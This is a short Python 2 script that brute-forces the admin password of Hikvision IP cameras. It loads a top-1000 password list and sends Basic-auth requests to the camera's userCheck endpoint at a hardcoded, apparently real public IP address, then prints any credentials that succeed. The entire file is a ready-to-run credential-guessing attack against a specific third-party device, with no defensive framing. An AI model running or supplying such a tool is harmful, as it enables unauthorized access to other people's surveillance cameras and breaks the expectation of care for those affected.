import base64
import requests
from threading import *

url =  '/PSIA/Custom/HIK/userCheck'

def getusers():
    users = []
    fp = open('password-top1000.txt', 'r')
    ip = fp.readlines()
    for user in ip:
        users.append('admin:' + user.strip('\n'))
    return users

def scan(ip):
    users = getusers()
    ip = ip.strip('\n')
    site = "http://" + ip
    site = site + url
    i = 0
    for user in users:
        user_pass = 'Basic ' + base64.b64encode(user)
        headers = {'Authorization': user_pass}
        try:
            r = requests.get(site, headers=headers)
            print i, r
            i = i + 1
            if '200' in r.text:
                print user, r.text
        except:
            return 0

if __name__ == '__main__':
    ip = '112.91.211.155'
    scan(ip)
    #print getusers()
